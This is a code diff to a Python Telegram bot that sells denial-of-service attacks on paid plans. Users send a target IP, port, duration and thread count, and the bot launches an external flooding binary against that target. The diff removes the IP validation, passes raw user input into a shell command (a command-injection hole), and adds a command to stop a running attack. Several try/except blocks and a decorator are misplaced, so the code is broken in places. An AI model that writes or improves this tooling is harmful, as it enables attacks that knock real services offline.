@@ -7,7 +7,6 @@ import time
 from pymongo import MongoClient
 from datetime import datetime, timedelta
 import certifi
-import socket
 import random
 from subprocess import Popen
 from threading import Thread
@@ -132,100 +131,94 @@ def approve_or_disapprove_user(message):
 
 
 # Initialize attack flag, duration, and start time
+# Estado del ataque
 bot.attack_in_progress = False
-bot.attack_duration = 0  # Store the duration of the ongoing attack
-bot.attack_start_time = 0  # Store the start time of the ongoing attack
+bot.attack_duration = 0
+bot.attack_start_time = 0
+bot.attack_process = None  # Guardar el proceso del ataque
 
 @bot.message_handler(commands=['attack'])
 def handle_attack_command(message):
     user_id = message.from_user.id
     chat_id = message.chat.id
 
-    try:
-        user_data = users_collection.find_one({"user_id": user_id})
-        if not user_data or user_data['plan'] == 0:
-            bot.send_message(chat_id, "*🚫 Access Denied!*\n"  # Access Denied message
-                                       "*You need to be approved to use this bot.*\n"  # Need approval message
-                                       "*Contact the owner for assistance: @SOULCRACKS.*", parse_mode='Markdown')  # Contact owner message
-            return
+    user_data = users_collection.find_one({"user_id": user_id})
+    if not user_data or user_data['plan'] == 0:
+        bot.send_message(chat_id, "*🚫 Access Denied!*\n"
+                                   "*You need to be approved to use this bot.*", parse_mode='Markdown')
+        return
 
-        # Check plan limits
-        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
-            bot.send_message(chat_id, "*🧡 Instant Plan is currently full!* \n"  # Instant Plan full message
-                                       "*Please consider upgrading for priority access.*", parse_mode='Markdown')  # Upgrade message
-            return
+    if bot.attack_in_progress:
+        bot.send_message(chat_id, "*⚠️ There's already an attack in progress!*\n"
+                                   "*Use `/stop` to end the current attack.*", parse_mode='Markdown')
+        return
 
-        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
-            bot.send_message(chat_id, "*💥 Instant++ Plan is currently full!* \n"  # Instant++ Plan full message
-                                       "*Consider upgrading or try again later.*", parse_mode='Markdown')  # Upgrade message
-            return
-
-        if bot.attack_in_progress:
-            bot.send_message(chat_id, "*⚠️ Please wait!*\n"  # Busy message
-                                       "*The bot is busy with another attack.*\n"  # Current attack message
-                                       "*Check remaining time with the /when command.*", parse_mode='Markdown')  # Check remaining time
-            return
-
-        bot.send_message(chat_id, "*💣 Ready to launch an attack?*\n"  # Ready to launch message
-                                   "*Please provide the target IP, port, and duration in seconds.*\n"  # Provide details message
-                                   "*Example: 167.67.25 6296 60* 🔥\n"  # Example message
-                                   "*Let the chaos begin! 🎉*", parse_mode='Markdown')  # Start chaos message
-        bot.register_next_step_handler(message, process_attack_command)
+    bot.send_message(chat_id, "*💣 Ready to launch an attack?*\n"
+                               "*Send the target IP, port, duration (seconds), and number of threads in this format:*\n"
+                               "`<ip> <port> <duration> <threads>`\n"
+                               "*Example: 167.67.25 6296 60 10*", parse_mode='Markdown')
+    bot.register_next_step_handler(message, process_attack_command)
 
     except Exception as e:
         logging.error(f"Error in attack command: {e}")
 
-
-def is_valid_ip(ip):
-    try:
-        socket.inet_aton(ip)
-        return True
-    except socket.error:
-        return False
-
 def process_attack_command(message):
     try:
         args = message.text.split()
-        if len(args) != 3:
+        if len(args) != 4:
             bot.send_message(message.chat.id, "*❗ Error!*\n"
-                                               "*Please use the correct format and try again.*\n"
-                                               "*Make sure to provide all three inputs! 🔄*", parse_mode='Markdown')
+                                               "*Please provide all required parameters: IP, port, duration, and threads.*", parse_mode='Markdown')
             return
 
-        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])
+        target_ip, target_port, duration, threads = args[0], int(args[1]), int(args[2]), int(args[3])
 
-        # Validar que la IP sea correcta
-        if not is_valid_ip(target_ip):
-            bot.send_message(message.chat.id, "*❗ Error!*\n"
-                                               "*Invalid IP format.*\n"
-                                               "*Please provide a valid IP address.*", parse_mode='Markdown')
-            return
-
-        # Validar que el puerto no esté en los puertos bloqueados
         if target_port in blocked_ports:
-            bot.send_message(message.chat.id, f"*🔒 Port {target_port} is blocked.*\n"
-                                               "*Please select a different port to proceed.*", parse_mode='Markdown')
+            bot.send_message(message.chat.id, f"*🔒 Port {target_port} is blocked.*", parse_mode='Markdown')
             return
 
-        # Validar que la duración no sea mayor a 599 segundos
-        if duration >= 600:
-            bot.send_message(message.chat.id, "*⏳ Maximum duration is 599 seconds.*\n"
-                                               "*Please shorten the duration and try again!*", parse_mode='Markdown')
-            return  
+        if duration > 599:
+            bot.send_message(message.chat.id, "*⏳ Maximum duration is 599 seconds.*", parse_mode='Markdown')
+            return
 
-        bot.attack_in_progress = True  # Marcar que un ataque está en progreso
-        bot.attack_duration = duration  # Almacenar la duración del ataque en curso
-        bot.attack_start_time = time.time()  # Registrar la hora de inicio
+        bot.attack_in_progress = True
+        bot.attack_duration = duration
+        bot.attack_start_time = time.time()
 
-        # Iniciar el ataque
-        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
-        bot.send_message(message.chat.id, f"*🚀 Attack Launched! 🚀*\n\n"  # Mensaje de lanzamiento de ataque
-                                           f"*📡 Target Host: {target_ip}*\n"  # Mensaje de IP del objetivo
-                                           f"*👉 Target Port: {target_port}*\n"  # Mensaje de puerto del objetivo
-                                           f"*⏰ Duration: {duration} seconds! Let the chaos unfold! 🔥*", parse_mode='Markdown')  # Mensaje de duración
+        # Lanzar el ataque como un proceso separado
+        bot.attack_process = Popen(f"./soul {target_ip} {target_port} {duration} {threads}", shell=True)
+
+        bot.send_message(message.chat.id, f"*🚀 Attack Launched!*\n"
+                                           f"*Target IP:* {target_ip}\n"
+                                           f"*Port:* {target_port}\n"
+                                           f"*Duration:* {duration} seconds\n"
+                                           f"*Threads:* {threads}", parse_mode='Markdown')
+    except Exception as e:
+        logging.error(f"Error in process_attack_command: {e}")
+        bot.send_message(message.chat.id, "*❗ An error occurred. Please try again.*", parse_mode='Markdown')  # Duration message
 
     except Exception as e:
         logging.error(f"Error in processing attack command: {e}")
+        
+        @bot.message_handler(commands=['stop'])
+def stop_attack(message):
+    chat_id = message.chat.id
+
+    if not bot.attack_in_progress:
+        bot.send_message(chat_id, "*❌ No attack is currently in progress.*", parse_mode='Markdown')
+        return
+
+    if bot.attack_process:
+        bot.attack_process.terminate()
+        bot.attack_process = None
+
+    bot.attack_in_progress = False
+    bot.attack_duration = 0
+    bot.attack_start_time = 0
+
+    bot.send_message(chat_id, "*🛑 Attack has been stopped successfully!*", parse_mode='Markdown')
+    
+    except Exception as e:
+        logging.error(f"Error in stop command: {e}")
 
 
 
@@ -239,19 +232,16 @@ def start_asyncio_thread():
 def when_command(message):
     chat_id = message.chat.id
     if bot.attack_in_progress:
-        elapsed_time = time.time() - bot.attack_start_time  # Calculate elapsed time
-        remaining_time = bot.attack_duration - elapsed_time  # Calculate remaining time
+        elapsed_time = time.time() - bot.attack_start_time
+        remaining_time = bot.attack_duration - elapsed_time
 
         if remaining_time > 0:
-            bot.send_message(chat_id, f"*⏳ Time Remaining: {int(remaining_time)} seconds...*\n"
-                                       "*🔍 Hold tight, the action is still unfolding!*\n"
-                                       "*💪 Stay tuned for updates!*", parse_mode='Markdown')
+            bot.send_message(chat_id, f"*⏳ Time Remaining: {int(remaining_time)} seconds*", parse_mode='Markdown')
         else:
-            bot.send_message(chat_id, "*🎉 The attack has successfully completed!*\n"
-                                       "*🚀 You can now launch your own attack and showcase your skills!*", parse_mode='Markdown')
+            bot.send_message(chat_id, "*🎉 The attack has completed!*", parse_mode='Markdown')
+            bot.attack_in_progress = False
     else:
-        bot.send_message(chat_id, "*❌ No attack is currently in progress!*\n"
-                                   "*🔄 Feel free to initiate your attack whenever you're ready!*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*❌ No attack is currently in progress.*", parse_mode='Markdown')
 
 
 @bot.message_handler(commands=['myinfo'])
